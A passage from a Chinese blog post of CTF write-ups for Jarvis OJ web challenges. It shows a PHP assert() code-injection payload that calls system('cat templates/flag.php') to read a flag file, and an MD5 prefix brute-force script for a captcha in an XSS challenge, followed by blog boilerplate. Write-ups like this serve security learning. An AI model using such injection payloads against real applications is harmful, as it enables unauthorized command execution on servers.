class="string">"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>先看一下strpos()</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strpos</span><span class="params">()</span></span> 函数查找字符串在另一字符串中第一次出现的位置。</span><br><span class="line">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</span><br></pre></td></tr></table></figure>
</li>
<li><p>下面为绕过</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> <span class="keyword">file</span> =<span class="string">"templates /（我们插入的内容）.php"</span></span><br><span class="line">然而不能出现<span class="string">".."</span>,也就是不能目录穿越</span><br><span class="line">理论上我们想要如此：<span class="keyword">system</span>(<span class="string">'cat templates/flag.php'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>所以插入如下</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">','</span>t<span class="string">')=== system('</span>cat templates/<span class="built_in">flag</span>.php<span class="string">');//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">得到</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">"templates/"</span> . <span class="string">','</span>t<span class="string">')===system('</span>cat templates/<span class="built_in">flag</span>.php<span class="string">');// . ".php"'</span>, <span class="string">'..'</span>) === <span class="literal">false</span><span class="string">")</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#前面两边永真，后面注释掉，perfect!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>不过返回<strong>Detected hacking attempt!</strong>,查源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// TODO</span></span></span><br><span class="line"><span class="php"><span class="comment">//$FLAG = '61dctf&#123;8e_careful_when_us1ng_ass4rt&#125;';</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">Detected hacking attempt!</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="61dctf-babyxss"><a href="#61dctf-babyxss" class="headerlink" title="[61dctf]babyxss"></a>[61dctf]babyxss</h1><p>题目入口：<a href="http://web.jarvisoj.com:32800/" target="_blank" rel="noopener">http://web.jarvisoj.com:32800/</a><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hint1</span>: csp bypass</span><br><span class="line"></span><br><span class="line"><span class="attribute">Hint1</span>: 最近问机器人有没有挂掉的人很多，这里解释一下，机器人是用系统的corntab起的，除非题目一起挂了，不然机器人是不会挂的，如果题目可以正常访问但是做不出来请检查自己的payload，不要让我再重复回答机器人挂没挂这个问题了。</span><br></pre></td></tr></table></figure></p>
<ol>
<li>一个提交框，主要是verify不知道<blockquote>
<p>( PS：substr($verify,0,4) === ‘5e51’ )</p>
</blockquote>
</li>
<li><p>以上为样式，每次都会变，下面直接爆破</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">str=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(len(str)):</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> range(len(str)):</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> range(len(str)):</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> range(len(str)):</span><br><span class="line">				mingwen=str[a]+str[b]+str[c]+str[d]</span><br><span class="line">				flag=hashlib.md5()</span><br><span class="line">				flag.update(mingwen)</span><br><span class="line">				md5=flag.hexdigest()</span><br><span class="line">				<span class="keyword">if</span> md5[:<span class="number">4</span>]==<span class="string">'5e51'</span>:</span><br><span class="line">			 		print mingwen</span><br><span class="line">			 		<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功提交</p>
<blockquote>
<p>Admin has got your secret and will read it soon.</p>
</blockquote>
</li>
<li>这题真的试了很多payload都不行，vps也收不到referer的信息，真的怀疑环境问题 <del>不是自己菜吗？</del> 下面直接贴<a href="https://www.twblogs.net/a/5b7e5a8c2b7177683856d57e" target="_blank" rel="noopener">大佬WP</a></li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一边查资料一边做题总算把这个平台的web搞掂，<del>不会做的再看看WP，虽然可能会偷懒233</del>，尽管不完全是独自做出来的，但还是收获不少知识，掌握不少姿势</p>

      
    </div>

    

    
    
    
    
	<div>
	
		﻿<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	
	</div>
	
    

    
       
    
    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/11/强网杯部分WP及Jarvis OJ(一)/" rel="next" title="强网杯部分WP及Jarvis OJ(一)">
                <i class="fa fa-chevron-left"></i> 强网杯部分WP及Jarvis OJ(一)
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/18/ichunqiu-web学习/" rel="prev" title="ichunqiu-web学习">
                ichunqiu-web学习 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      
      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Cy9nus">
            
              <p class="site-author-name" itemprop="name">Cy9nus</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">15</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              

              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/Cy9nusG4rd3n" title="GitHub &rarr; https://github.com/Cy9nusG4rd3n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="mailto:595318589@qq.com" title="E-Mail &rarr; mailto:595318589@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://weibo.com/" title="Weibo &rarr; https://weibo.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://plus.google.com/" title="Google &rarr; https://plus.google.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i>Google</a>
                </span>
              
            </div>
          
		  <div id="music163player">
    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34341308&auto=1&height=66"></iframe>
</div>

          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#flag在管理员手里"><span class="nav-number">1.</span> <span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Chopper"><span class="nav-number">2.</span> <span class="nav-text">Chopper</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Easy-Gallery"><span class="nav-number">3.</span> <span class="nav-text">Easy Gallery</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Simple-Injection"><span class="nav-number">4.</span> <span class="nav-text">Simple Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#api调用"><span class="nav-number">5.</span> <span class="nav-text">api调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#图片上传漏洞"><span class="nav-number">6.</span> <span class="nav-text">图片上传漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHPINFO"><span class="nav-number">7.</span> <span class="nav-text">PHPINFO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">8.</span> <span class="nav-text">WEB?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#61dctf-admin"><span class="nav-number">9.</span> <span class="nav-text">[61dctf]admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#61dctf-inject"><span class="nav-number">10.</span> <span class="nav-text">[61dctf]inject</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#61dctf-register"><span class="nav-number">11.</span> <span class="nav-text">[61dctf]register</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#61dctf-babyphp"><span class="nav-number">12.</span> <span class="nav-text">[61dctf]babyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#61dctf-babyxss"><span class="nav-number">13.</span> <span class="nav-text">[61dctf]babyxss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">14.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cy9nus</span>

  

  
</div>









<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共27.5k字</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv" title="总访客量">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="site-pv" title="总访问量">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  
    
      
  
  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>









  





  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script id="ribbon" type="text/javascript" size="300" alpha="0.6" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>



  



  








  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'g6m8NJreyw7EDEGnHk5jtKwq-gzGzoHsz',
        appKey: 'evJGU4bX7K62eAyT9bH4eNUn',
        placeholder: '到此一游？',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: false
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  
  

  

  

  

  

  

  

</body>
</html>
